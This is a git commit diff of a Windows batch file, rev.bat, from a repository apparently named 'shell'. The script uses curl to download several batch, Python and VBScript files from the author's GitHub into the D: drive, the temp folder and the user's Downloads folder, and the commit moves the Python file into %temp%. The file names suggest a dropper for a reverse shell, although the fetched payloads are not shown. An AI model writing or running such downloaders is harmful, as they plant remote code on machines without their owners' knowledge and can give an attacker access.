ca6d5e7e5af2bc39dc6b5fd0614ea8f336b04521
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-03 21:34:05 +0300

    Update rev.bat

--- rev.bat
+++ rev.bat
@@ -1,7 +1,7 @@
 @echo off
 set "downloads_dir=%USERPROFILE%\Downloads"
 curl https://raw.githubusercontent.com/0x2034/shell/main/pro.bat -o D:\pro.bat
-curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o D:\sh.py
+curl https://raw.githubusercontent.com/0x2034/shell/main/sh.py -o %temp%\sh.py
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb.vbs -o D:\vb.vbs
 curl https://raw.githubusercontent.com/0x2034/shell/main/vb1.vbs -o "%downloads_dir%\vb1.vbs"
 curl https://raw.githubusercontent.com/0x2034/shell/main/post.bat -o "%downloads_dir%\post.bat"
